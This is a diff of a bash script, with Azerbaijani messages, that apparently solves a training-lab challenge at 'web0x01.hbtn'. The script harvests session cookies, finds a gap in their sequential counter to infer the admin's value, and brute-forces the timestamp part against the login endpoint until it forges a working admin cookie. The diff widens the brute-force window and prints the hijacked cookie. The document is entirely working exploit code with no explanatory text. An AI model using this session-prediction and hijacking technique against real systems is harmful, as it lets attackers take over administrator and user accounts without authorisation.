@@ -1,13 +1,14 @@
 #!/bin/bash
+
 URL="http://web0x01.hbtn"
 PAGE="/a1/hijack_session/"
 LOGIN="/api/a1/hijack_session/login"
 
-echo "[*] Session-lar toplanır..."
+echo "[*] Session-lar yığılır (real-time)..."
 
 sessions=()
 
-for i in {1..15}; do
+for i in {1..6}; do
   s=$(curl -s -D - "$URL$PAGE" \
     | grep -i "^Set-Cookie: hijack_session=" \
     | cut -d= -f2 \
@@ -15,41 +16,43 @@ for i in {1..15}; do
 
   echo "[$i] $s"
   sessions+=("$s")
-  sleep 0.3
+  sleep 0.15
 done
 
 echo
-echo "[*] Counter GAP axtarılır..."
+echo "[*] GAP axtarılır..."
 
-prev_counter=0
+prev=0
+ADMIN_COUNTER=""
 
 for s in "${sessions[@]}"; do
-  counter=$(echo "$s" | cut -d- -f5)
+  c=$(echo "$s" | cut -d- -f5)
 
-  if [[ "$prev_counter" -ne 0 && $((prev_counter+1)) -ne "$counter" ]]; then
-    ADMIN_COUNTER=$((prev_counter+1))
+  if [[ "$prev" -ne 0 && $((prev+1)) -ne "$c" ]]; then
+    ADMIN_COUNTER=$((prev+1))
     echo "[+] GAP tapıldı → Admin counter: $ADMIN_COUNTER"
     break
   fi
-
-  prev_counter=$counter
+  prev=$c
 done
 
 if [[ -z "$ADMIN_COUNTER" ]]; then
-  echo "[-] GAP tapılmadı"
+  echo "[-] GAP tapılmadı, yenidən işə sal"
   exit 1
 fi
 
 PREFIX=$(echo "${sessions[0]}" | cut -d- -f1-4)
+
 TS1=$(echo "${sessions[-2]}" | cut -d- -f6)
 TS2=$(echo "${sessions[-1]}" | cut -d- -f6)
 
-START=$((TS1+1))
-END=$((TS2-1))
+START=$((TS1-50))
+END=$((TS2+50))
 
+echo "[*] Prefix   : $PREFIX"
 echo "[*] Timestamp aralığı: $START → $END"
 echo
-echo "[*] Brute-force başlayır..."
+echo "[*] Admin session brute edilir..."
 
 for ts in $(seq $START $END); do
   COOKIE="$PREFIX-$ADMIN_COUNTER-$ts"
@@ -60,10 +63,11 @@ for ts in $(seq $START $END); do
 
   if [[ "$res" != *"failed"* ]]; then
     echo
-    echo "[🎯 UĞUR TAPILDI]"
+    echo "[🎯 ADMIN TAPILDI]"
+    echo "COOKIE = $COOKIE"
     echo "$res"
     exit 0
   fi
 done
 
-echo "[-] Flag tapılmadı"
+echo "[-] Flag tapılmadı (scripti yenidən işə sal)"
